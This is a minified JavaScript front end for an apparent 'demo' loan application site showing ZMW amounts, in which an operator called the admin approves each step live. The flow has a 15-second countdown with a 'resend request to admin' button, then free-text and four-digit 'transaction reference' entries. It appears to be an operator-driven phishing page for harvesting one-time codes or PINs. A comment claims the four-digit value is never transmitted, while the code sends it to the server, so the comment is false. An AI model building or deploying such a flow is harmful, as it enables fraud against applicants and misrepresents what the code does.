const form=document.querySelector('#loanForm');let applicationId='',timer=null,amountRequested=0,countdownTimer=null,countdownStarted=false,referenceRejectionNotified=false;
const $=id=>document.getElementById(id);
function startReferenceCountdown(){
 if(countdownStarted)return;
 if(countdownTimer)clearInterval(countdownTimer);
 countdownStarted=true;
 let remaining=15;
 const value=$('countdownValue'),ring=$('countdownRing');
 $('referenceCountdownWrap').hidden=false;$('resendReferenceBtn').hidden=true;$('submitReference').disabled=false;
 value.textContent=remaining;ring.style.setProperty('--progress','100%');
 countdownTimer=setInterval(()=>{
  remaining=Math.max(0,remaining-1);value.textContent=remaining;
  ring.style.setProperty('--progress',(remaining/15*100)+'%');
  if(remaining===0){clearInterval(countdownTimer);countdownTimer=null;$('resendReferenceBtn').hidden=false;}
 },1000);
}
$('referenceText').addEventListener('input',()=>{$('referenceError').textContent='';});
function show(el){form.hidden=true;$('statusPage').hidden=true;$('stepTwoPage').hidden=true;$('stepThreePage').hidden=true;$('successPage').hidden=true;document.body.classList.toggle('step-two-active',el===$('stepTwoPage'));el.hidden=false}
function resetForm(){document.body.classList.remove('step-two-active');if(timer)clearInterval(timer);if(countdownTimer)clearInterval(countdownTimer);countdownTimer=null;countdownStarted=false;referenceRejectionNotified=false;timer=null;applicationId='';form.reset();form.hidden=false;$('statusPage').hidden=true;$('stepTwoPage').hidden=true;$('stepThreePage').hidden=true;$('successPage').hidden=true;$('error').textContent='';$('referenceError').textContent='';$('referenceText').value='';$('referenceNumber').value='';document.querySelectorAll('.reference-digit').forEach(x=>x.value='');$('confirmReference').checked=false;$('retryBtn').hidden=true;$('retryReferenceBtn').hidden=true;$('referenceWaiting').hidden=true;}
function statusUpdate(d){
 if(d.status==='approved'){$('approvedAmount').textContent='ZMW '+Number(d.amount||amountRequested).toLocaleString('en-ZM');show($('successPage'));if(timer)clearInterval(timer);return;}
 if(d.status==='approved_confirmation'){show($('stepThreePage'));$('confirmationError').textContent='';return;}
 if(d.status==='rejected_confirmation'){show($('stepThreePage'));$('confirmationError').textContent='The transaction reference was marked incorrect. Please check it and submit again.';refDigits.forEach(x=>x.value='');$('confirmFourDigitReference').disabled=false;$('confirmFourDigitReference').textContent='Submit reference for review';return;}
 if(d.status==='rejected_reference'){show($('stepTwoPage'));$('stepTwoMessage').textContent='The reviewer marked the transaction reference details as incorrect. Please correct them and resubmit.';$('referenceError').textContent='The details entered were marked wrong. Please check and submit again.';$('referenceWaiting').hidden=true;$('submitReference').disabled=false;$('retryReferenceBtn').hidden=false;countdownStarted=false;startReferenceCountdown();return;}
 $('applicationId').textContent=applicationId;
 if(d.status==='approved_details') {show($('stepTwoPage'));$('stepTwoMessage').textContent='Enter the non-sensitive transaction reference details.';$('referenceWaiting').hidden=true;$('submitReference').disabled=false;$('retryReferenceBtn').hidden=true;startReferenceCountdown();return;}
 if(d.status==='pending_reference') {show($('stepTwoPage'));$('stepTwoMessage').textContent='Your transaction reference details have been submitted and are waiting for admin review.';$('referenceWaiting').hidden=false;$('submitReference').disabled=true;$('resendReferenceBtn').hidden=true;$('referenceCountdownWrap').hidden=true;$('retryReferenceBtn').hidden=true;return;}
 if(d.status==='pending_confirmation'){show($('stepThreePage'));$('confirmationError').textContent='Reference submitted. Waiting for admin review…';$('confirmFourDigitReference').disabled=true;return;}
 if(d.status==='rejected_details'){resetForm();$('error').textContent='The admin marked the details entered as incorrect. Please review them and submit again.';return;}
 show($('statusPage'));$('retryBtn').hidden=true;$('detailsWaitingText').parentElement.hidden=false;
 $('stageTag').textContent='APPLICATION REVIEW';$('resultTitle').textContent='Submitted for review';$('resultMessage').textContent='Your demo application is waiting for assigned reviewer approval.'
}
async function refresh(){if(!applicationId)return;try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId));const d=await r.json();if(r.ok)statusUpdate(d)}catch{}}
form.addEventListener('submit',async e=>{e.preventDefault();$('error').textContent='';const btn=$('submitBtn');btn.disabled=true;btn.textContent='Submitting…';try{const admin=new URLSearchParams(location.search).get('admin')||'';amountRequested=Number($('amount').value);const payload={full_name:$('fullName').value.trim(),phone:$('phone').value.trim(),reference_id:$('referenceNumber').value.trim(),amount:amountRequested,admin};const r=await fetch('/api/applications',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(payload)});const d=await r.json();if(!r.ok)throw new Error(d.error||'Unable to submit.');applicationId=d.id;statusUpdate(d);if(timer)clearInterval(timer);timer=setInterval(refresh,4000)}catch(err){$('error').textContent=err.message}finally{btn.disabled=false;btn.textContent='Continue →'}});
$('submitReference').addEventListener('click',async()=>{
 const text=$('referenceText').value.trim();$('referenceError').textContent='';
 if(!text){$('referenceError').textContent='Enter the non-sensitive transaction reference details.';return}
 if(/\b(pin|password|one[- ]time|otp|verification code|security code)\b/i.test(text)||/(^|\D)\d{4,8}(?!\d)/.test(text)){$('referenceError').textContent='Submit only a non-sensitive transaction reference, not a PIN, OTP, or verification code.';return}
 if(!$('confirmReference').checked){$('referenceError').textContent='Please confirm this is non-sensitive transaction reference information.';return}
 const btn=$('submitReference');btn.disabled=true;btn.textContent='Submitting…';
 try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId)+'/reference',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({reference_text:text})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Could not submit reference.');$('referenceText').value='';$('confirmReference').checked=false;referenceRejectionNotified=false;statusUpdate(d);if(timer)clearInterval(timer);timer=setInterval(refresh,4000)}catch(e){$('referenceError').textContent=e.message;btn.disabled=false}finally{btn.textContent='Confirm and submit'}
});
$('resendReferenceBtn').addEventListener('click',async()=>{
 $('referenceError').textContent='';const btn=$('resendReferenceBtn');btn.disabled=true;btn.textContent='Notifying admin…';
 try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId)+'/resend-reference',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Could not notify admin.');$('referenceError').textContent='Admin has been notified. You can continue entering the transaction reference details.';countdownStarted=false;startReferenceCountdown();}
 catch(e){$('referenceError').textContent=e.message;btn.disabled=false;btn.textContent='Resend request to admin'}
 finally{if(!btn.hidden){btn.disabled=false;btn.textContent='Resend request to admin'}}
});
$('retryBtn').addEventListener('click',resetForm);
$('retryReferenceBtn').addEventListener('click',()=>{$('referenceText').value='';$('confirmReference').checked=false;$('referenceError').textContent='';$('retryReferenceBtn').hidden=true;$('submitReference').disabled=false;$('referenceWaiting').hidden=true;countdownStarted=false;startReferenceCountdown();});

// Four-digit field is for a non-sensitive transaction-reference segment only; it is never transmitted.
const refDigits=[...document.querySelectorAll('.reference-digit')];refDigits.forEach((input,index)=>{input.addEventListener('input',()=>{input.value=input.value.replace(/\D/g,'').slice(0,1);if(input.value&&index<refDigits.length-1)refDigits[index+1].focus();});input.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!input.value&&index>0)refDigits[index-1].focus();});});
$('confirmFourDigitReference').addEventListener('click',async()=>{const digits=refDigits.map(x=>x.value).join('');$('confirmationError').textContent='';if(!/^\d{4}$/.test(digits)){$('confirmationError').textContent='Enter all four digits of the non-sensitive transaction reference.';return}const btn=$('confirmFourDigitReference');btn.disabled=true;btn.textContent='Submitting…';try{const r=await fetch('/api/applications/'+encodeURIComponent(applicationId)+'/confirmation',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({confirmation_reference:digits})});const d=await r.json();if(!r.ok)throw new Error(d.error||'Could not submit reference.');statusUpdate(d);if(timer)clearInterval(timer);timer=setInterval(refresh,4000)}catch(e){$('confirmationError').textContent=e.message;btn.disabled=false;btn.textContent='Submit reference for review'}});
